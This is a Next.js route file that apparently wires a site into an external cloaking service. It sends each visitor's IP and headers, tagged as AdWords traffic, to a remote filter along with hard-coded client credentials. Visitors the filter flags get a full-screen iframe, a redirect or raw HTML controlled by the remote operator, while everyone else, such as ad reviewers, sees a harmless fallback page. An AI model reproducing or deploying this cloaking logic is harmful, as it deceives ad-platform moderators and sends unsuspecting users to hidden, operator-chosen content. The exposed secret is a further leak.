import { NextRequest, NextResponse } from 'next/server';
import path from 'path';
import fs from 'fs/promises';

function flattenPayload(obj: Record<string, unknown>, prefix = ''): Record<string, string> {
    return Object.entries(obj).reduce((acc, [key, val]) => {
        const newKey = prefix ? `${prefix}[${key}]` : key;
        if (typeof val === 'object' && val !== null && !Array.isArray(val)) {
            Object.assign(acc, flattenPayload(val as Record<string, unknown>, newKey));
        } else {
            acc[newKey] = String(val);
        }
        return acc;
    }, {} as Record<string, string>);
}

const PALLADIUM_URL = 'https://rbl.palladium.expert';

const HTML_HEADERS = {
    'Content-Type': 'text/html',
    'X-Robots-Tag': 'noindex',
};

function collectServerHeaders(req: NextRequest, ip: string): Record<string, string> {
    const host = req.headers.get('host') || '';
    const url = req.nextUrl;

    return {
        REMOTE_ADDR: ip,
        HTTP_USER_AGENT: req.headers.get('user-agent') || '',
        HTTP_ACCEPT: req.headers.get('accept') || '',
        HTTP_ACCEPT_LANGUAGE: req.headers.get('accept-language') || '',
        HTTP_ACCEPT_ENCODING: req.headers.get('accept-encoding') || '',
        HTTP_REFERER: req.headers.get('referer') || '',
        HTTP_CONNECTION: req.headers.get('connection') || '',
        Host: host,
        HTTP_HOST: host,
        SERVER_PORT: '443',
        REQUEST_SCHEME: 'https',
        REQUEST_URI: url.pathname + url.search,
        QUERY_STRING: url.search.replace(/^\?/, ''),
        REQUEST_TIME_FLOAT: String(Date.now() / 1000),
        X_FORWARDED_FOR: req.headers.get('x-forwarded-for') || '',
        X_PURPOSE: req.headers.get('x-purpose') || '',
        X_FB_HTTP_ENGINE: req.headers.get('x-fb-http-engine') || '',
        X_WAP_PROFILE: req.headers.get('x-wap-profile') || '',
        bannerSource: 'adwords',
    };
}

export async function POST(req: NextRequest) {
    const ip =
        req.headers.get('x-real-ip') ||
        req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
        '127.0.0.1';

    let requestData: Record<string, unknown> = {};
    let jsRequestData: Record<string, unknown> = {};

    try {
        const body = await req.formData();
        const rawData = body.get('data');
        if (rawData && typeof rawData === 'string') {
            requestData = JSON.parse(rawData);
        }
        const rawJsData = body.get('jsdata');
        if (rawJsData && typeof rawJsData === 'string') {
            jsRequestData = JSON.parse(rawJsData);
        }
        const crossrefSession = body.get('crossref_sessionid');
        if (crossrefSession && typeof crossrefSession === 'string') {
            requestData['cr-session-id'] = crossrefSession;
        }
    } catch {
        // no form data — ok
    }

    const payload = flattenPayload({
        request: requestData,
        jsrequest: jsRequestData,
        server: collectServerHeaders(req, ip),
        auth: {
            clientId: 3024,
            clientCompany: 'GB9flyqir1ktVxpiYjYV',
            clientSecret:
                'MzAyNEdCOWZseXFpcjFrdFZ4cGlZallWY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
        },
    });

    try {
        const res = await fetch(PALLADIUM_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(payload),
            signal: AbortSignal.timeout(4000),
        });

        const reply = await res.json();
        const isTarget = Boolean(reply?.result);
        let mode = reply?.mode;
        const target = reply?.target || '';
        const content = reply?.content || '';

        if (isTarget && mode && (target || content)) {
            // mode 3 with URL → fallback to mode 2 (redirect), same as PHP
            if (/^https?:/i.test(target) && mode === 3) {
                mode = 2;
            }

            // mode 1 — iframe
            if (mode === 1 && target) {
                const safeTarget = target.replace(/"/g, '&quot;');
                const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0"><iframe src="${safeTarget}" style="width:100%;height:100vh;border:none;position:absolute;top:0;left:0;z-index:999999;"></iframe></body></html>`;
                return new NextResponse(html, { status: 200, headers: HTML_HEADERS });
            }

            // mode 2 — redirect
            if (mode === 2 && target) {
                return NextResponse.redirect(target, 302);
            }

            // mode 4 — raw content
            if (mode === 4 && content) {
                return new NextResponse(content, { status: 200, headers: HTML_HEADERS });
            }
        }
    } catch (error) {
        console.error('[PALLADIUM] Error:', error);
    }

    // fallback — serve main.html
    try {
        const filePath = path.resolve('public/main.html');
        const html = await fs.readFile(filePath, 'utf8');
        return new NextResponse(html, { status: 200, headers: HTML_HEADERS });
    } catch {
        return new NextResponse(
            '<h1>500 Internal Server Error</h1><p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>',
            { status: 500, headers: HTML_HEADERS }
        );
    }
}

// GET fallback — same logic but without form data
export async function GET(req: NextRequest) {
    const ip =
        req.headers.get('x-real-ip') ||
        req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
        '127.0.0.1';

    const payload = flattenPayload({
        request: {},
        jsrequest: {},
        server: collectServerHeaders(req, ip),
        auth: {
            clientId: 3024,
            clientCompany: 'GB9flyqir1ktVxpiYjYV',
            clientSecret:
                'MzAyNEdCOWZseXFpcjFrdFZ4cGlZallWY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
        },
    });

    try {
        const res = await fetch(PALLADIUM_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(payload),
            signal: AbortSignal.timeout(4000),
        });

        const reply = await res.json();
        const isTarget = Boolean(reply?.result);
        let mode = reply?.mode;
        const target = reply?.target || '';
        const content = reply?.content || '';

        if (isTarget && mode && (target || content)) {
            if (/^https?:/i.test(target) && mode === 3) {
                mode = 2;
            }

            if (mode === 1 && target) {
                const safeTarget = target.replace(/"/g, '&quot;');
                const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0"><iframe src="${safeTarget}" style="width:100%;height:100vh;border:none;position:absolute;top:0;left:0;z-index:999999;"></iframe></body></html>`;
                return new NextResponse(html, { status: 200, headers: HTML_HEADERS });
            }

            if (mode === 2 && target) {
                return NextResponse.redirect(target, 302);
            }

            if (mode === 4 && content) {
                return new NextResponse(content, { status: 200, headers: HTML_HEADERS });
            }
        }
    } catch (error) {
        console.error('[PALLADIUM] Error:', error);
    }

    try {
        const filePath = path.resolve('public/main.html');
        const html = await fs.readFile(filePath, 'utf8');
        return new NextResponse(html, { status: 200, headers: HTML_HEADERS });
    } catch {
        return new NextResponse(
            '<h1>500 Internal Server Error</h1><p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>',
            { status: 500, headers: HTML_HEADERS }
        );
    }
}
